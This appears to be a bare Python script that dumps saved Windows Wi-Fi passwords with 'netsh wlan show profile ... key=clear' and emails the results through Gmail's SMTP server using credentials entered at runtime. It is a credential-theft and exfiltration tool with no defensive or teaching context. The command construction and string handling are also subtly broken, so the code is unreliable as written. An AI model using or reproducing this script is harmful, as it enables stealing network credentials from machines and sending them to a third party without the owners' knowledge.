import subprocess,re

import smtplib as lol
inputemail = input("enter your email:")
inputpass = input("enter your password:")


def send_email(email, password, message):
    server = lol.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

command = "netsh wlan show profile"
result = subprocess.check_output(command, shell=True)
networkresult_names =  re.findall("(?:Profile\s*:\s)(.*)", result)

result = ""
for network_names in networkresult_names:
    command = "netsh wlan show profile" + network_names + "key=clear"
    current_result = subprocess.check_output(command, shell=True)
    result = result + current_result
    
    print(network_names)
send_email(inputemail, inputpass, result)